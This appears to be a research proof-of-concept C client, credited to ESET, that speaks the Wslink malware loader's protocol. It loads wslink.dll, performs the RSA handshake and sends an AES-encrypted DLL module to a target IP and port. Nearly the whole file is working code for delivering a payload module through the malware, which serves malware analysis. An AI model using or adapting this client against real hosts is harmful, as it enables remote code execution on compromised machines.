// -*- encoding: utf8 -*-
// 
// Copyright (c) 2021 ESET spol. s r.o.
// Author: Vladislav Hrčka <vladislav.hrcka@eset.com>
// See LICENSE file for redistribution.

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/aes.h>

#include "client.h"

int main(int argc, char **argv) {
	if (argc < 3) {
		printf("%s: Missing IP or port\nUsage: %s [IP] [PORT]", argv[0], argv[0]);
		return -6;
	}
	struct wslink_functions wsf;
	if (!init_wslink_functions(&wsf)){
		printf("Failed to load Wslink dll.");
		return -7;
	}
	SOCKET s = init_connection(argv[1], atoi(argv[2]));
	if(!s) {
		printf("Connection could not be established.");
		return -1;
	}
	struct tls_context cnt;
	cnt.sock = s;
	char* private_key = get_private_key();
	if (private_key == NULL) {
		printf("Private key could not be read.");
		return -5;
	}
	if (!handshake(&wsf, &cnt, private_key)) {
		printf("Handshake failed.");
		return -3;
	}
	if (!send_module(&wsf, &cnt)) {
		printf("The module could not be sent.");
		return -4;
	}
	free(private_key);
	clear_socket(s);
	return 0;
}

int init_wslink_functions(struct wslink_functions* wsf) {
	long long dllBase = LoadLibrary("wslink.dll");
	if (dllBase == 0) {
		return 0;
	}
	void* bin = (void*) dllBase;
	
	wsf->symmetric_encrypt_send = (int (*)(struct tls_context*, void *, int))(bin + symmetric_encrypt_send_offset);
	wsf->receive_wrapper = (int (*)(SOCKET, char *, int, int))(bin + receive_wrapper_offset);
	wsf->symmetric_receive_decrypt = (int (*)(struct tls_context*, void*, int))(bin + symmetric_receive_decrypt_offset);
	return 1;
}
 
// Code from http://hayageek.com/rsa-encryption-decryption-openssl-c/
RSA * createRSA(unsigned char * key, int isPublic)
{
	RSA *rsa= NULL;
	BIO *keybio ;
	keybio = BIO_new_mem_buf(key, -1);
	if (keybio==NULL)
	{
		return 0;
	}
	if(isPublic)
	{
		rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
	}
	else
	{
		rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
	} 
	return rsa;
}

// https://stackoverflow.com/questions/9889492/how-to-do-encryption-using-aes-in-openssl
void handleErrors(void)
{
	unsigned long errCode;

	printf("An error occurred\n");
	while(errCode = ERR_get_error())
	{
		char *err = ERR_error_string(errCode, NULL);
		printf("%s\n", err);
	}
	abort();
}

int aes_encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext) {
	EVP_CIPHER_CTX *ctx = NULL;
	int len = 0, ciphertext_len = 0;

	/* Create and initialise the context */
	if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

	/* Initialise the encryption operation. */
	if(1 != EVP_EncryptInit(ctx, EVP_aes_256_cbc(), key, iv))
		handleErrors();

	/* Provide the message to be encrypted, and obtain the encrypted output.
	 * EVP_EncryptUpdate can be called multiple times if necessary
	 */
	if(plaintext)
	{
		if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
			handleErrors();

		ciphertext_len = len;
	}

	if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();
	ciphertext_len += len;

	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);

	return ciphertext_len;
}

char* get_private_key() {
	FILE *f = fopen("rsa2048.pem", "rb");
	if (!f) {
		return 0;
	}
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);

	char *data = malloc(fsize + 1);
	fread(data, 1, fsize, f);
	fclose(f);
	
	return data;
}

void clear_socket(SOCKET s) {
	shutdown(s, SD_BOTH);
	closesocket(s);
	WSACleanup();
}

int handshake(struct wslink_functions* wsf, struct tls_context* cnt, char* private_rsa_key) {
	char hello[hello_len];
	char encrypted_hello[modulus_len];
	memset(hello, 0, hello_len);
	RSA *rsa = createRSA(private_rsa_key, 0);
	// sends hello
	int rsa_sig_size = RSA_private_encrypt(hello_len, hello, encrypted_hello, rsa, RSA_PKCS1_PADDING);
	if (send(cnt->sock, encrypted_hello, rsa_sig_size, 0) == SOCKET_ERROR) {
		return 0;
	}
	
	// receives symmetric key
	char encrypted_answer[modulus_len];
	char decrypted_answer[answer_len];
	if (!wsf->receive_wrapper(cnt->sock, encrypted_answer, modulus_len, assymetric_timeout)) {
		return 0;
	}
	rsa_sig_size = RSA_private_decrypt(modulus_len, encrypted_answer, decrypted_answer, rsa, RSA_PKCS1_PADDING);
	if (answer_len != rsa_sig_size) {
		return 0;
	}
	struct handshake_answer* ha = (struct handshake_answer*) decrypted_answer;
	memcpy(cnt->key, ha->key, key_len);
	memcpy(cnt->iv, ha->iv, iv_len);
	
	// sends symmetric key back for verification
	char reencrypted_answer[modulus_len];
	rsa_sig_size = RSA_private_encrypt(answer_len, (void*) decrypted_answer, reencrypted_answer, rsa, RSA_PKCS1_PADDING);
	if (send(cnt->sock, reencrypted_answer, rsa_sig_size, 0) == SOCKET_ERROR) {
		return 0;
	}
	return 1;
}

int get_module(struct wslink_module* wsm) {
	FILE *f = fopen("module.dll", "rb");
	if (!f) {
		return 0;
	}
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);

	void *data = malloc(fsize);
	fread(data, 1, fsize, f);
	fclose(f);
	
	void* enc_data = malloc(fsize + (iv_len - fsize % iv_len));
	int enc_size = aes_encrypt(data, fsize, module_key, null_iv, enc_data);
	free(data);
	
	wsm->data = enc_data;
	wsm->len = enc_size;
	return 1;
}

int send_module(struct wslink_functions* wsf, struct tls_context* cnt) {
	struct module_id prev_mod;
	// receive signature of the previously loaded module
	if (!wsf->symmetric_receive_decrypt(cnt, (void*) &prev_mod, sizeof(prev_mod))) {
		return 0;
	}
	// send the signature of the module to be sent
	if (!wsf->symmetric_encrypt_send(cnt, module_sig, strlen(module_sig))) {
		return 0;
	}
	struct wslink_module wsm;
	// load the module from file
	if (!get_module(&wsm)) {
		return 0;
	}
	// send the module
	if (!wsf->symmetric_encrypt_send(cnt, (void*) &(wsm.len), sizeof(wsm.len))) {
		free(wsm.data);
		return 0;
	}
	if (!wsf->symmetric_encrypt_send(cnt, wsm.data, wsm.len)) {
		free(wsm.data);
		return 0;
	}
	free(wsm.data);
	// send the encryption key of the module
	if (!wsf->symmetric_encrypt_send(cnt, module_key, key_len)) {
		return 0;
	}
	return 1;
}

SOCKET init_connection(char* ip, int port) {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != NO_ERROR) {
		return 0;
	}
	
	struct sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(ip);
	clientService.sin_port = htons(port);
	
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {
		WSACleanup();
		return 0;
	}
	if (connect(s, (SOCKADDR *) &clientService, sizeof(clientService)) == SOCKET_ERROR) {
		clear_socket(s);
		return 0;
	}
	return s;
}
